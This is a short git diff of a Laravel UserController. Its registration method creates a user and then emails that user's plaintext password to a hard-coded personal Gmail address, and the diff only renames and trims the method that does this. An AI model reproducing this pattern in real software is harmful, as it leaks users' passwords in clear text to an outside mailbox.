@@ -4,10 +4,6 @@ namespace App\Http\Controllers;
 
 use App\Http\Controllers;
 use Illuminate\Http\Request;
-use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
-use Illuminate\Foundation\Bus\DispatchesJobs;
-use Illuminate\Foundation\Validation\ValidatesRequests;
-use Illuminate\Routing\Controller as BaseController;
 use App\Models\User;
 use Illuminate\Support\Facades\Mail;
 use App\Mail\SendEmail;
@@ -22,17 +18,15 @@ class UserController extends Controller
             'password'=>'required',
             ]);      
         $user = User::create($validatedData);
-        $this->basic_email($request);
+        $this->sendEmail($request->password);
         return $user;
     }
 
-    public function basic_email(Request $request) {
+    public function sendEmail($password) {
         $data = array(
-            'name'      =>  $request->name,
-            'password'   =>   $request->password
+            'password' => $password
         );
-
+        
         Mail::to('arwanashaat@gmail.com')->send(new SendEmail($data));
-        return back()->with('success', 'Thanks for contacting us!');
-     }
+    }
 }
